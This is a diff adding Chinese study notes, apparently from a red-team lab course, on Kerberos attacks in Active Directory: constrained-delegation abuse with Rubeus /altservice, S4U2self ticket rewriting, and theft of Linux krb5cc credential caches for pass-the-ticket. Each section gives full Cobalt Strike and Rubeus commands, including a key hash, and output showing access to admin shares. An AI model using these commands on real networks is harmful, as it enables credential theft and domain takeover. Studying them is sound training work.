@@ -428,3 +428,215 @@ beacon> ls \\wkstn-2\c$
 [+] host called home, sent: 54 bytes
 [-] could not open \\wkstn-2\c$\*: 1326
 ```
+
+# Alternate Service Name
+
+这个就是约束委派的一个具体例子
+
+原文：
+> The eventlog service on DC-2 is not immediately useful for lateral movement, but the service name is not validated in s4u. This means we can request a TGS for any service run by DC-2$, using /altservice flag in Rubeus.
+
+
+我的理解是，一台存在约束委派的计算机，可以利用Rubeus.exe通过指定指定flag ```/altservice```去访问任意服务。在这个例子里，本来是委派了eventlog服务，现在通过命令我们可以访问cifs服务。
+
+命令
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
+
+[*] Action: S4U
+
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Using aes256-cts-hmac-sha1 hash: 952891c9933c675cbbc2186f10e934ddd85ab3abc3f4d2fc2f7e74fcdd01239d
+[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\srv-2$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFLD [...snip...] MuSU8=
+
+[*] Action: S4U
+
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Building S4U2self request for: 'SRV-2$@DEV.CYBERBOTIC.IO'
+[+] Sequence number is: 1421721239
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'SRV-2$@DEV.CYBERBOTIC.IO'
+[*] base64(ticket.kirbi):
+
+      doIFfj [...snip...] WLTIk
+
+[*] Impersonating user 'Administrator' to target SPN 'eventlog/dc-2.dev.cyberbotic.io'
+[*]   Final tickets will be for the alternate services 'cifs'
+[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
+[*] Building S4U2proxy request for service: 'eventlog/dc-2.dev.cyberbotic.io'
+[+] Sequence number is: 1070349348
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':
+
+      doIGvD [...snip...] ljLmlv
+
+[+] Ticket successfully imported!
+```
+
+参数解释：
+/msdsspn ： 就是原来委派的一个服务，这里是```eventlog/dc-2.dev.cyberbotic.io```
+/altservice : 这里换成了委派的另一个服务```cifs```，这样就可以访问dc-2的文件系统了
+
+
+现在可以访问```dc-2```的文件系统
+```
+beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     10/18/2016 01:59:39   Documents and Settings
+          dir     02/23/2018 11:06:05   PerfLogs
+          dir     12/13/2017 21:00:56   Program Files
+          dir     02/10/2021 02:01:55   Program Files (x86)
+          dir     02/23/2021 16:49:25   ProgramData
+          dir     10/18/2016 02:01:27   Recovery
+          dir     02/21/2021 11:20:15   Shares
+          dir     02/19/2021 11:39:02   System Volume Information
+          dir     02/17/2021 18:50:37   Users
+          dir     02/19/2021 13:26:27   Windows
+ 379kb    fil     01/28/2021 07:09:16   bootmgr
+ 1b       fil     07/16/2016 13:18:08   BOOTNXT
+ 512mb    fil     03/09/2021 10:26:16   pagefile.sys
+```
+
+
+# S4U2self Abuse
+
+前提：拥有计算机的 RC4、AES256 或 TGT
+
+滥用 S4U2self extension - 如果我们拥有域计算机的 RC4、AES256 或 TGT，则可以访问域计算机
+
+我理解跟上面的原理是一样的，这里是使用了一个```Asn1Editor```工具把原本是```WKSTN-2$```的服务改成了```cifs/wkstn-2.dev.cyberbotic.io```，然后就可以访问wkstn-2.dev.cyberbotic.io的文件服务（cifs）
+
+修改前：
+```
+C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  WKSTN-2$
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  nlamb
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  2/28/2022 7:30:02 PM
+  EndTime                  :  3/1/2022 5:19:32 AM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
+```
+
+修改后(注意ServiceName的值)：
+```
+C:\Tools\Rubeus\Rubeus\bin\Debug>Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  nlamb
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  2/28/2022 7:30:02 PM
+  EndTime                  :  3/1/2022 5:19:32 AM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
+```
+
+访问文件服务：
+```
+beacon> getuid
+[*] You are DEV\bfarmer
+
+beacon> make_token DEV\nlamb FakePass
+[+] Impersonated DEV\bfarmer
+
+beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+beacon> ls \\wkstn-2.dev.cyberbotic.io\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/19/2021 14:35:19   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     10/18/2016 01:59:39   Documents and Settings
+          dir     02/23/2018 11:06:05   PerfLogs
+          dir     01/20/2022 15:43:43   Program Files
+          dir     02/16/2022 12:46:57   Program Files (x86)
+          dir     01/20/2022 16:46:38   ProgramData
+          dir     10/18/2016 02:01:27   Recovery
+          dir     02/19/2021 14:45:10   System Volume Information
+          dir     05/05/2021 16:13:00   Users
+          dir     05/06/2021 09:35:17   Windows
+ 379kb    fil     01/28/2021 07:09:16   bootmgr
+ 1b       fil     07/16/2016 13:18:08   BOOTNXT
+ 256mb    fil     02/28/2022 09:30:57   pagefile.sys
+```
+
+# Linux Credential Cache
+
+提取域内linux机器的凭据
+
+ccache files存储在```/tmp```目录下，注意它们都以```krb5cc```开头
+```
+svc_oracle@nix-1:~$ ls -l /tmp/
+total 20
+-rw------- 1 jking      domain users 1342 Mar  9 15:21 krb5cc_1394201122_MerMmG
+-rw------- 1 svc_oracle domain users 1341 Mar  9 15:33 krb5cc_1394201127_NkktoD
+```
+
+需要root权限才能下载上面的文件，如果没有root权限，先提权
+
+下载到本地以后，使用 Impacket把上面的文件转成kirbi格式
+```
+root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] converting ccache to kirbi...
+[+] done
+```
+
+
+Cobalt Strike也有一个转kirbi的命令，但是在这个例子里，好像不能识别
+```
+beacon> kerberos_ccache_use C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
+[-] Could not extract ticket from C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
+```
+
+
+ptt,访问srv-2
+```
+beacon> make_token DEV\jking FakePass
+[+] Impersonated DEV\bfarmer
+
+beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi
+
+beacon> ls \\srv-2\c$
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     10/18/2016 01:59:39   Documents and Settings
+          dir     02/23/2018 11:06:05   PerfLogs
+          dir     12/13/2017 21:00:56   Program Files
+          dir     02/10/2021 02:01:55   Program Files (x86)
+          dir     02/23/2021 17:08:43   ProgramData
+          dir     10/18/2016 02:01:27   Recovery
+          dir     02/17/2021 18:28:36   System Volume Information
+          dir     03/09/2021 12:32:56   Users
+          dir     02/17/2021 18:28:54   Windows
+ 379kb    fil     01/28/2021 07:09:16   bootmgr
+ 1b       fil     07/16/2016 13:18:08   BOOTNXT
+ 256mb    fil     03/09/2021 12:30:35   pagefile.sys
+```
